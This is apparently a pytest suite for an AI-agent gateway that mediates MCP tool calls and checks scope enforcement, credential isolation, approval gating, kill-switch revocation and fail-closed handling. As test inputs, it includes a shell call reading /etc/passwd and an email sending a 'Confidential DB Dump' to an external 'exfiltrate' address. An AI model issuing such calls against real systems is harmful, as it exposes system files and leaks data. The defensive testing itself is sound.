import pytest
from anubis.services.auth.service import token_service
from anubis.services.gateway.service import revoke_entity
from anubis.services.gateway.credential_broker import credential_broker


@pytest.fixture
def registered_agent_and_token(client):
    """Helper fixture: registers owner, agent, and issues valid token."""
    # 1. Register owner
    owner_resp = client.post("/owners", json={"name": "Alice Gate", "email": "alice_gate@corp.local"})
    owner_id = owner_resp.json()["id"]

    # 2. Register agent
    agent_resp = client.post("/agents", json={
        "name": "Gateway-Agent-01",
        "owner_id": owner_id,
        "purpose": "Verify MCP gateway mediation",
        "risk_tier": "low"
    })
    agent_id = agent_resp.json()["agent"]["id"]

    # 3. Register tool
    client.post("/tools", json={
        "name": "read_database",
        "server": "corp-db",
        "description": "Read records from corporate DB",
        "risk_level": "low",
        "required_scope": "tools:read",
        "downstream_credential_ref": "DB_READ_SECRET",
        "downstream_secret_value": "sec_live_db_readonly_49819284"
    })

    # 4. Issue token with tools:read scope
    issued = token_service.issue_token(
        agent_id=agent_id,
        instance_id="inst-gw-1",
        scope=["tools:read", "tools:email"],
        task_id="task-mcp-test",
        on_behalf_of="alice_gate",
        ttl_minutes=15
    )
    token = issued["access_token"]

    return {
        "agent_id": agent_id,
        "token": token
    }


def test_gateway_mcp_tools_list(client, registered_agent_and_token):
    token = registered_agent_and_token["token"]
    resp = client.post(
        "/mcp/corp-db",
        headers={"Authorization": f"Bearer {token}"},
        json={
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/list",
            "params": {}
        }
    )
    assert resp.status_code == 200
    res_data = resp.json()["result"]
    assert "tools" in res_data
    tool_names = [t["name"] for t in res_data["tools"]]
    assert "read_database" in tool_names


def test_gateway_authorized_tool_call_and_credential_brokering(client, registered_agent_and_token):
    token = registered_agent_and_token["token"]

    resp = client.post(
        "/mcp/corp-db",
        headers={"Authorization": f"Bearer {token}"},
        json={
            "jsonrpc": "2.0",
            "id": 42,
            "method": "tools/call",
            "params": {
                "name": "read_database",
                "arguments": {"table": "customers"}
            }
        }
    )
    assert resp.status_code == 200
    res_data = resp.json()
    assert res_data["id"] == 42
    result = res_data["result"]
    assert result["status"] == "success"
    assert result["authenticated_with_credential_ref"] is True

    # Critical Credential Isolation Check:
    # Ensure downstream secret NEVER leaked in response
    assert "sec_live_db_readonly_49819284" not in str(res_data)


def test_gateway_unauthorized_tool_call_missing_scope(client, registered_agent_and_token):
    token = registered_agent_and_token["token"]

    # Agent has tools:read and tools:email, but NOT tools:finance
    resp = client.post(
        "/mcp/finance-server",
        headers={"Authorization": f"Bearer {token}"},
        json={
            "jsonrpc": "2.0",
            "id": 99,
            "method": "tools/call",
            "params": {
                "name": "execute_transfer",
                "arguments": {"amount": 500, "destination": "Vendor-X"}
            }
        }
    )
    # Should be denied by policy with 403 Forbidden
    assert resp.status_code == 403
    assert "tools:finance" in resp.json()["detail"].lower()


def test_gateway_argument_violation_triggers_approval(client, registered_agent_and_token):
    token = registered_agent_and_token["token"]

    # External recipient violates policy rule and triggers require_approval
    resp = client.post(
        "/mcp/mail-server",
        headers={"Authorization": f"Bearer {token}"},
        json={
            "jsonrpc": "2.0",
            "id": 105,
            "method": "tools/call",
            "params": {
                "name": "send_email",
                "arguments": {
                    "recipient": "exfiltrate@foreign-entity.com",
                    "subject": "Confidential DB Dump"
                }
            }
        }
    )
    assert resp.status_code == 200
    res_data = resp.json()
    result = res_data["result"]
    assert result["status"] == "pending_approval"
    assert "external email" in result["message"].lower()


def test_gateway_dangerous_tool_denied(client, registered_agent_and_token):
    token = registered_agent_and_token["token"]

    # Calling system_shell on a low-risk agent is strictly denied
    resp = client.post(
        "/mcp/os-system",
        headers={"Authorization": f"Bearer {token}"},
        json={
            "jsonrpc": "2.0",
            "id": 108,
            "method": "tools/call",
            "params": {
                "name": "system_shell",
                "arguments": {"command": "cat /etc/passwd"}
            }
        }
    )
    assert resp.status_code == 403
    assert "prohibited" in resp.json()["detail"].lower()


def test_gateway_rejects_missing_and_invalid_token(client):
    # Missing token
    resp_missing = client.post(
        "/mcp/corp-db",
        json={"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "read_database"}}
    )
    assert resp_missing.status_code == 401

    # Invalid / corrupted token
    resp_corrupt = client.post(
        "/mcp/corp-db",
        headers={"Authorization": "Bearer not-a-valid-token-at-all"},
        json={"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "read_database"}}
    )
    assert resp_corrupt.status_code == 401


def test_gateway_instant_kill_switch_revocation(client, registered_agent_and_token):
    token = registered_agent_and_token["token"]
    agent_id = registered_agent_and_token["agent_id"]

    # Revoke agent immediately via kill switch
    revoke_entity(agent_id)

    resp = client.post(
        "/mcp/corp-db",
        headers={"Authorization": f"Bearer {token}"},
        json={
            "jsonrpc": "2.0",
            "id": 200,
            "method": "tools/call",
            "params": {"name": "read_database", "arguments": {}}
        }
    )
    assert resp.status_code == 403
    assert "revoked" in resp.json()["detail"].lower()


def test_gateway_fail_closed_on_policy_outage(client, registered_agent_and_token, monkeypatch):
    token = registered_agent_and_token["token"]

    # Simulate catastrophic policy engine outage / exception
    from anubis.services.policy.evaluator import policy_evaluator

    async def broken_evaluator(eval_input):
        raise ConnectionResetError("Connection to Policy Engine timed out (simulated network partition)")

    monkeypatch.setattr(policy_evaluator, "evaluate", broken_evaluator)

    resp = client.post(
        "/mcp/corp-db",
        headers={"Authorization": f"Bearer {token}"},
        json={
            "jsonrpc": "2.0",
            "id": 999,
            "method": "tools/call",
            "params": {"name": "read_database", "arguments": {}}
        }
    )
    # Gateway MUST fail closed (error code -32003 with Fail-Closed notice)
    assert resp.status_code == 200 or resp.status_code == 403
    data = resp.json()
    err_msg = data.get("detail") or data.get("error", {}).get("message", "")
    assert "fail-closed" in err_msg.lower() or "access denied" in err_msg.lower()
